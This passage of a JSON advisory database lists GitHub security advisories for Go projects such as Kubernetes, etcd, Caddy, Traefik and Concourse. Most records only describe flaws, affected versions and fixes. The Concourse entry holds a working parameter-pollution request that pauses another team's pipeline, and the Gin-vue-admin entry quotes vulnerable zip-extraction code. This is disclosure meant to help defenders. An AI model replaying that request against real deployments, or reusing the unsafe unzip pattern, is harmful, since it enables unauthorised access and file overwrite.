"2021-05-13T20:25:19Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-82hx-w2r5-c2wq", "modified": "2023-09-20T22:42:48Z", "published": "2022-02-15T01:57:18Z", "aliases": ["CVE-2020-8552"], "summary": "Kubernetes API Server DoS Via API Requests", "details": "The Kubernetes API server component in Kubernetes versions prior to 1.15.9, 1.16.0-1.16.6, and 1.17.0-1.17.2 has been found to be vulnerable to a denial of service attack via successful API requests.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "k8s.io/apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.15.10"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.16.0"}, {"fixed": "0.16.7"}]}]}, {"package": {"ecosystem": "Go", "name": "k8s.io/apiserver"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.17.0"}, {"fixed": "0.17.3"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-8552"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/issues/89378"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/pull/87669"}, {"type": "WEB", "url": "https://github.com/kubernetes/kubernetes/commit/5978856c4c7f10737a11c9540fe60b8475beecbb"}, {"type": "WEB", "url": "https://groups.google.com/forum/#!topic/kubernetes-security-announce/2UOlsba2g0s"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/3SOCLOPTSYABTE4CLTSPDIFE6ZZZR4LX/"}, {"type": "WEB", "url": "https://security.netapp.com/advisory/ntap-20200413-0003/"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-770", "CWE-789"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2021-05-06T21:48:16Z", "nvd_published_at": "2020-03-27T15:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-wp47-9r3h-xfgq", "modified": "2022-02-14T22:58:25Z", "published": "2022-02-07T00:00:23Z", "aliases": ["CVE-2022-23206"], "summary": "Server-Side Request Forgery in Apache Traffic Control", "details": "In Apache Traffic Control Traffic Ops prior to 6.1.0 or 5.1.6, an unprivileged user who can reach Traffic Ops over HTTPS can send a specially-crafted POST request to /user/login/oauth to scan a port of a server that Traffic Ops can reach.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/apache/trafficcontrol"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "6.0.0"}, {"fixed": "6.1.0"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/apache/trafficcontrol"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "5.1.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-23206"}, {"type": "WEB", "url": "https://lists.apache.org/thread/lsrd2mqj29vrvwsh8g0d560vvz8n126f"}], "database_specific": {"cwe_ids": ["CWE-918"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-14T22:58:25Z", "nvd_published_at": "2022-02-06T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-6rrw-4fm9-rghv", "modified": "2022-02-23T15:45:21Z", "published": "2022-02-19T00:01:36Z", "aliases": ["CVE-2022-0664"], "summary": "Use of Hard-coded Cryptographic Key in Netmaker", "details": "Netmaker prior to versions 0.8.5, 0.9.4, 0.10.0, and 0.10.1 uses a hard-coded cryptographic key.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.0/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.8.5"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/gravitl/netmaker"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0.9.0"}, {"fixed": "0.9.4"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-0664"}, {"type": "WEB", "url": "https://github.com/gravitl/netmaker/commit/9bee12642986cb9534e268447b70e6f0f03c59cf"}, {"type": "PACKAGE", "url": "https://github.com/gravitl/netmaker"}, {"type": "WEB", "url": "https://huntr.dev/bounties/29898a42-fd4f-4b5b-a8e3-ab573cb87eac"}], "database_specific": {"cwe_ids": ["CWE-321"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-02-23T15:45:21Z", "nvd_published_at": "2022-02-18T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-m332-53r6-2w93", "modified": "2022-10-06T23:03:57Z", "published": "2022-10-06T23:03:57Z", "aliases": ["CVE-2020-15112"], "summary": "etcd's WAL `ReadAll`  method vulnerable to an entry with large index causing panic", "details": "### Vulnerability type\nData Validation\n\n### Detail\nIn the ReadAll method in wal/wal.go, it is possible to have an entry index greater then the number of entries. This could cause issues when WAL entries are being read during consensus as an arbitrary etcd consensus participant could go down from a runtime panic when reading the entry.\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md)", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L"}], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.3.23"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.4.0"}, {"fixed": "3.4.10"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-m332-53r6-2w93"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2020-15112"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/11793"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/7d1cf640497cbcdfb932e619b13624112c7e3865"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/f4b650b51dc4a53a8700700dc12e1242ac56ba07"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf"}, {"type": "WEB", "url": "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/L6B6R43Y7M3DCHWK3L3UVGE2K6WWECMP/"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0005"}], "database_specific": {"cwe_ids": ["CWE-129", "CWE-20"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-06T23:03:57Z", "nvd_published_at": "2020-08-05T20:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-gr7w-x2jp-3xgw", "modified": "2022-10-06T22:58:56Z", "published": "2022-10-06T22:58:56Z", "aliases": ["CVE-2018-21246"], "summary": "Caddy vulnerable to Authentication Bypass due to mishandling of TLS client authentication", "details": "Caddy before 0.10.13 mishandles TLS client authentication, as demonstrated by an authentication bypass caused by the lack of the StrictHostMatching mode.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/caddyserver/caddy"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.10.13"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2018-21246"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/pull/2099"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/commit/4d9ee000c8d2cbcdd8284007c1e0f2da7bc3c7c3"}, {"type": "WEB", "url": "https://bugs.gentoo.org/715214"}, {"type": "PACKAGE", "url": "https://github.com/caddyserver/caddy"}, {"type": "WEB", "url": "https://github.com/caddyserver/caddy/releases/tag/v0.10.13"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2020-0043"}], "database_specific": {"cwe_ids": ["CWE-287"], "severity": "CRITICAL", "github_reviewed": true, "github_reviewed_at": "2022-10-06T22:58:56Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-5jp2-vwrj-99rf", "modified": "2022-12-27T22:03:26Z", "published": "2022-10-19T20:26:05Z", "aliases": ["CVE-2022-31683"], "summary": "Team scope authorization bypass when Post/Put request with :team_name in body, allows HTTP parameter pollution ", "details": "### Impact\nFor some Post/Put Concourse endpoint containing `:team_name` in the URL, a Concourse user can send a request with body including `:team_name=team2` to bypass team scope check to gain access to certain resources belong to any other team. The user only needs a valid user session and belongs to team2.\n\nExploitable endpoints:\n```\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/builds/:build_name\", Method: \"POST\", Name: RerunJobBuild},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/pause\", Method: \"PUT\", Name: PauseJob},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/unpause\", Method: \"PUT\", Name: UnpauseJob},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/jobs/:job_name/schedule\", Method: \"PUT\", Name: ScheduleJob},\n\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/pause\", Method: \"PUT\", Name: PausePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/unpause\", Method: \"PUT\", Name: UnpausePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/expose\", Method: \"PUT\", Name: ExposePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/hide\", Method: \"PUT\", Name: HidePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/rename\", Method: \"PUT\", Name: RenamePipeline},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/archive\", Method: \"PUT\", Name: ArchivePipeline},\n\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/enable\", Method: \"PUT\", Name: EnableResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/disable\", Method: \"PUT\", Name: DisableResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/versions/:resource_config_version_id/pin\", Method: \"PUT\", Name: PinResourceVersion},\n{Path: \"/api/v1/teams/:team_name/pipelines/:pipeline_name/resources/:resource_name/unpin\", Method: \"PUT\", Name: UnpinResource},\n\t\n{Path: \"/api/v1/teams/:team_name/artifacts\", Method: \"POST\", Name: CreateArtifact},\n```\n\n### Steps to reproduce\n\n1. Set up a Concourse deployment with team 1 (with pipeline 1) and team 2. User is in team 2 but not team 1.\n2. Login as user to team 2.\n```\nfly -t ci login -n team2 -u user -p password\n```\n3. Try pausing pipeline 1 in team 1 using fly. Verify the command output is `pipeline 'pipeline1' not found`.\n```\nfly -t ci pause-pipeline -p pipeline1\n```\n\n\n4. Send a customized request through `fly curl` command intend to pause pipeline 1 again. \n```\nfly -t ci curl /api/v1/teams/team1/pipelines/pipeline1/pause -- -X PUT -d \":team_name=team2\" -H \"Content-type: application/x-www-form-urlencoded\"\n```\n5. pipeline 1 in team 1 will be paused.\n\nIn step 4, the parameter pollution would allow an user from any team to pause a pipeline that belongs to other team.\n\n### Patches\nConcourse [v6.7.9](https://github.com/concourse/concourse/releases/tag/v6.7.9) and [v7.8.3](https://github.com/concourse/concourse/releases/tag/v7.8.3) were both released with a fix on October 12, 2022.\n\nInstead of using [`FormValue`](https://pkg.go.dev/net/http#Request.FormValue) to parse team_name in the request, where allows body parameters to take precedence over URL query string values, both patch versions are now using `URL.Query().Get()` over multiple scope handlers to prevent the parameter pollution.\n\n### Workarounds\nNo known workarounds for existing versions.\n\n### References\n * https://github.com/concourse/concourse/pull/8566: PR with the fix\n\n### For more information\nIf you have any questions or comments about this advisory, you may reach us privately at [security@concourse-ci.org](mailto:security@concourse-ci.org).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "6.7.9"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/concourse/concourse"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "7.0.0"}, {"fixed": "7.8.3"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/concourse/concourse/security/advisories/GHSA-5jp2-vwrj-99rf"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-31683"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/pull/8566"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/pull/8580"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/commit/57e06711b0d861775a5a6bd078a34abeb0e2638e"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/commit/ba885834d9bcbb9d1ccb9964faa7af0e78a72205"}, {"type": "PACKAGE", "url": "https://github.com/concourse/concourse"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/releases/tag/v6.7.9"}, {"type": "WEB", "url": "https://github.com/concourse/concourse/releases/tag/v7.8.3"}], "database_specific": {"cwe_ids": ["CWE-863"], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-19T20:26:05Z", "nvd_published_at": "2022-12-19T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-528j-9r78-wffx", "modified": "2023-03-30T14:46:31Z", "published": "2022-10-06T23:17:24Z", "aliases": [], "summary": "etcd user credentials are stored in WAL logs in plaintext", "details": "### Vulnerability type\nData Exposure\n\n### Workarounds\nThe etcd assumes that the on disk files are secure. The possible fixes have been provided, however, it is the responsibility of the etcd users to make sure that the etcd server WAL log files are secure. The [etcd doesn't encrypt key/value data stored on disk drives](https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/security.md#does-etcd-encrypt-data-stored-on-disk-drives).\n\n### Detail\nUser credentials (login and password) are stored in WAL entries on each user authentication. If the WAL log files are not secure, it can potentially expose sensitive information.\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/client/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.4.0"}, {"fixed": "3.4.10"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/client/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.3.23"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-528j-9r78-wffx"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/issues/10132"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/pull/11818"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/commit/585814082b8c8b7db272b30b365b81d27df4a4cb"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/master/Documentation/op-guide/security.md#does-etcd-encrypt-data-stored-on-disk-drives"}, {"type": "WEB", "url": "https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf"}], "database_specific": {"cwe_ids": ["CWE-256"], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-10-06T23:17:24Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-59hj-62f5-fgmc", "modified": "2022-10-25T19:59:37Z", "published": "2022-10-24T19:00:24Z", "aliases": ["CVE-2022-43677"], "summary": "free5GC vulnerable to malformed NGAP message crashing the AMF and NGAP decoders", "details": "In free5GC 3.2.1, a malformed NGAP message can crash the AMF and NGAP decoders via an index-out-of-range panic in `aper.GetBitString`.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/free5gc/free5gc"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"last_affected": "3.2.1"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-43677"}, {"type": "WEB", "url": "https://github.com/free5gc/free5gc/issues/402"}, {"type": "PACKAGE", "url": "https://github.com/free5gc/free5gc"}, {"type": "WEB", "url": "https://pkg.go.dev/vuln/GO-2022-1083"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-25T19:59:37Z", "nvd_published_at": "2022-10-24T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-j92c-mmf7-j5x5", "modified": "2022-10-18T17:27:36Z", "published": "2022-10-18T17:27:36Z", "aliases": [], "summary": "Potential inter-blockchain communication (IBC) protocol compromise via \"Dragonberry\" vulnerability in cheqd", "details": "### Impact\nThis vulnerability affects IBC transfers due to a security vulnerability dubbed \"Dragonberry\" upstream in [Cosmos SDK](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.45.9). The vulnerability could allow malicious attackers to compromise chain-to-chain IBC transfers.\n\nThere is no vulnerability in the DID/resource modules for cheqd-node.\n\n### Patches\nNode operators are requested to upgrade to [cheqd-node v0.6.9](https://github.com/cheqd/cheqd-node/releases/tag/0.6.9) as soon as possible. Installation instructions are in the release notes. Please do not install any beta/pre-release versions.\n\n### Workarounds\nNo. The patch takes effect when more than 2/3rds of the voting power of the cheqd network has upgraded to this patch.\n\nAn emergency hotfix was released previously under v0.6.8 but this is now deprecated since [Cosmos SDK v0.45.9](https://github.com/cosmos/cosmos-sdk/releases/tag/v0.45.9) officially fixes this upstream.\n\n### References\n- [IBC Security Advisory on \"Dragonberry\"](https://forum.cosmos.network/t/ibc-security-advisory-dragonberry/7702/1) (and [associated security vulnerability \"Dragonfruit\"](https://forum.cosmos.network/t/cosmos-sdk-security-advisory-dragonfruit/7614))\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [cheqd-node repo](https://github.com/cheqd/cheqd-node/issues)\n* Email us at [security-github@cheqd.io](mailto:security-github@cheqd.io)\n* Message us on our community [Slack](http://cheqd.link/join-cheqd-slack) or [Discord](http://cheqd.link/discord-github)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/cheqd/cheqd-node"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "0.6.9"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/cheqd/cheqd-node/security/advisories/GHSA-j92c-mmf7-j5x5"}, {"type": "WEB", "url": "https://forum.cosmos.network/t/ibc-security-advisory-dragonberry/7702/1"}, {"type": "PACKAGE", "url": "https://github.com/cheqd/cheqd-node"}, {"type": "WEB", "url": "https://github.com/cosmos/cosmos-sdk/releases/tag/v0.45.9"}], "database_specific": {"cwe_ids": [], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-18T17:27:36Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-c6hx-pjc3-7fqr", "modified": "2022-10-13T20:08:57Z", "published": "2022-10-10T21:23:30Z", "aliases": ["CVE-2022-39271"], "summary": "Traefik HTTP/2 connections management could cause a denial of service", "details": "### Impact\n\nThere is a potential vulnerability in Traefik managing HTTP/2 connections.\nA closing HTTP/2 server connection could hang forever because of a subsequent fatal error. This failure mode could be exploited to cause a denial of service.\n\n### Patches\n\nTraefik v2.8.x: https://github.com/traefik/traefik/releases/tag/v2.8.8\nTraefik v2.9.x: https://github.com/traefik/traefik/releases/tag/v2.9.0-rc5\n\n### Workarounds\n\nNo workaround.\n\n### For more information\n\nIf you have any questions or comments about this advisory, please [open an issue](https://github.com/traefik/traefik/issues).\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "2.8.8"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/traefik/traefik/v2"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.9.0-rc1"}, {"fixed": "2.9.0-rc5"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/traefik/traefik/security/advisories/GHSA-c6hx-pjc3-7fqr"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-39271"}, {"type": "PACKAGE", "url": "https://github.com/traefik/traefik"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.8.8"}, {"type": "WEB", "url": "https://github.com/traefik/traefik/releases/tag/v2.9.0-rc5"}], "database_specific": {"cwe_ids": ["CWE-400", "CWE-755"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-10T21:23:30Z", "nvd_published_at": "2022-10-11T14:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-9gp7-6833-wv89", "modified": "2022-10-06T23:18:35Z", "published": "2022-10-06T23:18:35Z", "aliases": [], "summary": "etcd having a negative value for cluster node size results in an index out-of-bound panic during service discovery", "details": "### Vulnerability type\nData Validation\n\n### Detail\nWhen an etcd instance attempts to perform service discovery, if a cluster size is provided as a negative value, the etcd instance will panic without recovery.\n\n### References\nFind out more on this vulnerability in the [security audit report](https://github.com/etcd-io/etcd/blob/master/security/SECURITY_AUDIT.pdf)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Contact the [etcd security committee](https://github.com/etcd-io/etcd/blob/master/security/security-release-process.md#product-security-committee-psc)", "severity": [], "affected": [{"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/client/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "3.4.0"}, {"fixed": "3.4.10"}]}]}, {"package": {"ecosystem": "Go", "name": "go.etcd.io/etcd/client/v3"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "3.3.23"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/etcd-io/etcd/security/advisories/GHSA-9gp7-6833-wv89"}, {"type": "PACKAGE", "url": "https://github.com/etcd-io/etcd"}], "database_specific": {"cwe_ids": [], "severity": "LOW", "github_reviewed": true, "github_reviewed_at": "2022-10-06T23:18:35Z", "nvd_published_at": null}}, {"schema_version": "1.4.0", "id": "GHSA-qj6r-fhrc-jj5r", "modified": "2022-10-13T19:12:05Z", "published": "2022-10-13T19:12:05Z", "aliases": ["CVE-2022-36023"], "summary": "Remote denial of service in Hyperledger Fabric Gateway", "details": "### Impact\nIf a gateway client application sends a malformed request to a gateway peer it may crash the peer node.\nThis fix checks for the malformed gateway request and returns an error to the gateway client.\n\n### Patches\nFixed in v2.4.6.\n\n### Workarounds\nNone, users must upgrade to v2.4.6.\n\n### References\nhttps://github.com/hyperledger/fabric/releases/tag/v2.4.6\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Fabric](https://github.com/hyperledger/fabric)\n\n### Credits\nThank you to Haosheng Wang of OPPO ZIWU Security Lab for this disclosure.\n", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hyperledger/fabric"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "2.4.0"}, {"fixed": "2.4.6"}]}]}], "references": [{"type": "WEB", "url": "https://github.com/hyperledger/fabric/security/advisories/GHSA-qj6r-fhrc-jj5r"}, {"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-36023"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/3572"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/3576"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/pull/3577"}, {"type": "PACKAGE", "url": "https://github.com/hyperledger/fabric"}, {"type": "WEB", "url": "https://github.com/hyperledger/fabric/releases/tag/v2.4.6"}], "database_specific": {"cwe_ids": ["CWE-20"], "severity": "HIGH", "github_reviewed": true, "github_reviewed_at": "2022-10-13T19:12:05Z", "nvd_published_at": "2022-08-18T16:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7v3g-4878-5qrf", "modified": "2022-10-13T20:09:08Z", "published": "2022-10-12T12:00:21Z", "aliases": ["CVE-2022-41606"], "summary": "Nomad Panics On Job Submission With Bad Artifact Stanza Source URL", "details": "HashiCorp Nomad and Nomad Enterprise 1.0.2 up to 1.2.12, and 1.3.5 jobs submitted with an artifact stanza using invalid S3 or GCS URLs can be used to crash client agents. Fixed in 1.2.13, 1.3.6, and 1.4.0.", "severity": [{"type": "CVSS_V3", "score": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:H"}], "affected": [{"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "0"}, {"fixed": "1.2.13"}]}]}, {"package": {"ecosystem": "Go", "name": "github.com/hashicorp/nomad"}, "ranges": [{"type": "ECOSYSTEM", "events": [{"introduced": "1.3.0"}, {"fixed": "1.3.6"}]}]}], "references": [{"type": "ADVISORY", "url": "https://nvd.nist.gov/vuln/detail/CVE-2022-41606"}, {"type": "WEB", "url": "https://discuss.hashicorp.com"}, {"type": "WEB", "url": "https://discuss.hashicorp.com/t/hcsec-2022-22-nomad-panics-on-job-submission-with-bad-artifact-stanza-source-url/45420"}, {"type": "PACKAGE", "url": "https://github.com/hashicorp/nomad"}], "database_specific": {"cwe_ids": [], "severity": "MODERATE", "github_reviewed": true, "github_reviewed_at": "2022-10-12T20:03:06Z", "nvd_published_at": "2022-10-12T00:15:00Z"}}, {"schema_version": "1.4.0", "id": "GHSA-7gc4-r5jr-9hxv", "modified": "2022-10-27T18:38:32Z", "published": "2022-10-25T21:02:23Z", "aliases": ["CVE-2022-39345"], "summary": "Gin-vue-admin subject to Remote Code Execution via file upload vulnerability", "details": "### Impact\nGin-vue-admin < 2.5.4 has File upload vulnerabilities\u3002\nFile upload vulnerabilities are when a web server allows users to upload files to its filesystem without sufficiently validating things like their name, type, contents, or size. Failing to properly enforce restrictions on these could mean that even a basic image upload function can be used to upload arbitrary and potentially dangerous files instead. This could even include server-side script files that enable remote code execution.\n\n### Patches\n\nhttps://github.com/flipped-aurora/gin-vue-admin/pull/1264\n\n### Workarounds\n\nhttps://github.com/flipped-aurora/gin-vue-admin/pull/1264\n### References\n\n#1263 \n\n### For more information\nThe plugin installation function of Gin-Vue-Admin allows users to download zip packages from the plugin market and upload them for installation. This function has an arbitrary file upload vulnerability. A malicious attacker can upload a constructed zip package to traverse the directory and upload or overwrite arbitrary files on the server side.\n\nThe affected code https://github.com/flipped-aurora/gin-vue-admin/blob/main/server/service/system/sys_auto_code.go line 880 called the `utils.Unzip` method\n\n```\npaths, err := utils.Unzip(GVAPLUGPINATH+file.Filename, GVAPLUGPINATH)\n\tpaths = filterFile(paths)\n\tvar webIndex = -1\n\tvar serverIndex = -1\n\tfor i := range paths {\n\t\tpaths[i] = filepath.ToSlash(paths[i])\n\t\tpathArr := strings.Split(paths[i], \"/\")\n\t\tln := len(pathArr)\n\t\tif ln < 2 {\n\t\t\tcontinue\n\t\t}\n\t\tif pathArr[ln-2] == \"server\" && pathArr[ln-1] == \"plugin\" {\n\t\t\tserverIndex = i\n\t\t}\n\t\tif pathArr[ln-2] == \"web\" && pathArr[ln-1] == \"plugin\" {\n\t\t\twebIndex = i\n\t\t}\n\t}\n\tif webIndex == -1 && serverIndex == -1 {\n\t\tzap.L().Error(\"\u975e\u6807\u51c6\u63d2\u4ef6\uff0c\u8bf7\u6309\u7167\u6587\u6863\u81ea\u52a8\u8fc1\u79fb\u4f7f\u7528\")\n\t\treturn webIndex, serverIndex, errors.New(\"\u975e\u6807\u51c6\u63d2\u4ef6\uff0c\u8bf7\u6309\u7167\u6587\u6863\u81ea\u52a8\u8fc1\u79fb\u4f7f\u7528\")\n\t}\n...\n```\nThe https://github.com/flipped-aurora/gin-vue-admin/blob/main/server/utils/zip.go code defines the `utils.Unzip` method\n```\n//\u89e3\u538b\nfunc Unzip(zipFile string, destDir string) ([]string, error) {\n\tzipReader, err := zip.OpenReader(zipFile)\n\tvar paths []string\n\tif err != nil {\n\t\treturn []string{}, err\n\t}\n\tdefer zipReader.Close()\n\n\tfor _, f := range zipReader.File {\n\t\tfpath := filepath.Join(destDir, f.Name)\n\t\tpaths = append(paths, fpath)\n\t\tif 